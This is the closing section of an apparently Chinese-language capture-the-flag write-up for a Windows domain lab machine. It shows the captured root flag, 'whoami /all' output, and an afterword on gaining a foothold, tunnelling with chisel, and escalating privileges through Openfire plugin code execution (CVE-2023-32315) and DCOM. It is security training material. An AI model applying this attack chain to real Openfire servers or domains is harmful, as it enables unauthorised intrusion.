+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">administrator</span><span class="p">\</span><span class="n">desktop</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>                                                                  
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>                                                                  
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="n">-ar</span><span class="p">---</span>        <span class="n">3</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2024</span>   <span class="n">3</span><span class="p">:</span><span class="n">20</span> <span class="n">AM</span>             <span class="n">34</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>                                                              
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">administrator</span><span class="p">\</span><span class="n">desktop</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="n">1b68</span> <span class="p">(...)</span> <span class="n">8776</span>
+</span></code></pre></div>
+<hr />
+<h2 id="_2">总结·后记<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>2024/03/22</p>
+<p>这简直是我打过的最有趣的Windows靶机了。<br />
+一部分是因为利用这份<a href="https://orange-cyberdefense.github.io/ocd-mindmaps/">域渗透思维导图</a>，让我体验了多种以前未使用过的工具，包括chisel。<br />
+另一方面，openfire的线索设计太棒了。一开始以为是立足用的，想着竟然这么容易就找到是利用CVE-2023-32315？然后发现谷歌直接搜出来的这个CVE根本用不上，于是继续进行探索并立足。最后竟然是在提权中涉及这个CVE，并且靶机是给了个CVE-2023-32315已修复的版本。一开始疑惑着这个CVE果然还是不管用了，结果竟然是拿着手头上的已知凭据能登陆管理界面，然后又能利用CVE-2023-32315中提到的插件执行RCE来提权。多次牵引又打乱对这个漏洞的思维关联，最终还是柳暗花明，设计得十分有趣。</p>
+<p>关于<a href="#executedcom">ExecuteDCOM</a>，<br />
+后来复盘结合上面DCOM利用方法的文章，再去确认了下这个用户的组是否有里面提到的<code>Distributed COM Users</code>——还真有，原来这就是可利用的原因啊。</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">USER</span> <span class="n">INFORMATION</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="p">----------------</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="n">User</span> <span class="n">Name</span>        <span class="n">SID</span>                                         
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="p">================</span> <span class="p">============================================</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="n">jab</span><span class="p">\</span><span class="n">svc_openfire</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">715914501</span><span class="p">-</span><span class="n">2118353807</span><span class="p">-</span><span class="n">243417633</span><span class="p">-</span><span class="n">1104</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="nb">GROUP </span><span class="n">INFORMATION</span>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="p">-----------------</span>
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="nb">Group </span><span class="n">Name</span>                                  <span class="nb">Type </span>            <span class="n">SID</span>          <span class="n">Attributes</span>                                        
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="p">===========================================</span> <span class="p">================</span> <span class="p">============</span> <span class="p">==================================================</span>
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="n">Everyone</span>                                    <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">0</span>      <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Distributed</span> <span class="n">COM</span> <span class="n">Users</span>               <span class="k">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">562</span> <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span>                               <span class="k">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">545</span> <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Pre-Windows</span> <span class="n">2000</span> <span class="n">Compatible</span> <span class="n">Access</span>  <span class="k">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">554</span> <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Certificate</span> <span class="n">Service</span> <span class="n">DCOM</span> <span class="n">Access</span>     <span class="k">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">574</span> <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NETWORK</span>                        <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">2</span>      <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>            <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">11</span>     <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">This</span> <span class="n">Organization</span>              <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">15</span>     <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NTLM</span> <span class="n">Authentication</span>            <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">64</span><span class="p">-</span><span class="n">10</span>  <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a><span class="k">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">Medium</span> <span class="n">Plus</span> <span class="k">Mandatory</span> <span class="n">Level</span> <span class="n">Label</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">16</span><span class="p">-</span><span class="n">8448</span>                                                    
+</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>
+</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a>
+</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a><span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
+</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a><span class="p">----------------------</span>
+</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>
+</span><span id="__span-15-31"><a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a><span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                    <span class="n">State</span>  
+</span><span id="__span-15-32"><a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a><span class="p">=============================</span> <span class="p">==============================</span> <span class="p">=======</span>
+</span><span id="__span-15-33"><a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a><span class="n">SeMachineAccountPrivilege</span>     <span class="n">Add</span> <span class="n">workstations</span> <span class="n">to</span> <span class="n">domain</span>     <span class="n">Enabled</span>
+</span><span id="__span-15-34"><a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a><span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>       <span class="n">Enabled</span>
+</span><span id="__span-15-35"><a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a><span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="k">process</span> <span class="n">working</span> <span class="nb">set </span><span class="n">Enabled</span>
+</span><span id="__span-15-36"><a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a>
+</span><span id="__span-15-37"><a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a>
+</span><span id="__span-15-38"><a id="__codelineno-15-38" name="__codelineno-15-38" href="#__codelineno-15-38"></a><span class="n">USER</span> <span class="n">CLAIMS</span> <span class="n">INFORMATION</span>
+</span><span id="__span-15-39"><a id="__codelineno-15-39" name="__codelineno-15-39" href="#__codelineno-15-39"></a><span class="p">-----------------------</span>
+</span><span id="__span-15-40"><a id="__codelineno-15-40" name="__codelineno-15-40" href="#__codelineno-15-40"></a>
+</span><span id="__span-15-41"><a id="__codelineno-15-41" name="__codelineno-15-41" href="#__codelineno-15-41"></a><span class="n">User</span> <span class="n">claims</span> <span class="n">unknown</span><span class="p">.</span>
+</span><span id="__span-15-42"><a id="__codelineno-15-42" name="__codelineno-15-42" href="#__codelineno-15-42"></a>
+</span><span id="__span-15-43"><a id="__codelineno-15-43" name="__codelineno-15-43" href="#__codelineno-15-43"></a><span class="n">Kerberos</span> <span class="n">support</span> <span class="k">for</span> <span class="n">Dynamic</span> <span class="n">Access</span> <span class="n">Control</span> <span class="n">on</span> <span class="n">this</span> <span class="n">device</span> <span class="n">has</span> <span class="n">been</span> <span class="n">disabled</span><span class="p">.</span>
+</span></code></pre></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.top", "navigation.path", "navigation.expand", "search.suggest", "search.highlight", "search.share", "content.code.copy", "header.autohide", "toc.follow"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../../static/js/extra.js"></script>
+      
+    
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
